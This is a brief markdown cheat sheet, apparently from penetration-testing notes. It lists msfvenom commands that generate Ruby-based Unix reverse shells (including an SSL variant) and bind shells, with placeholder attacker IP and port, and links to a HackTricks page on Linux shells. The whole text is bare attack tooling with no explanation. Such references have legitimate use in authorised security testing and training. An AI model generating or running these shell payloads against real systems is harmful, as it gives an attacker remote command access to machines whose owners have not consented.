# Manual

## 01 - Generate Payloads

### 1.1 - Linux

#### 1.1.1 - Reverse Shells

```
$ msfvenom -p cmd/unix/reverse_ruby lhost=<IP> lport=<PORT>

$ msfvenom -p cmd/unix/reverse_ruby_ssl handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>
```

#### 1.1.2 - Bind Shells

```
$ msfvenom -p cmd/unix/bind_ruby lport=<PORT>

$ msfvenom -p cmd/unix/bind_ruby_ipv6 lport=<PORT>
```

---
## References

### Hacktricks

- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/shells/shells/linux.html)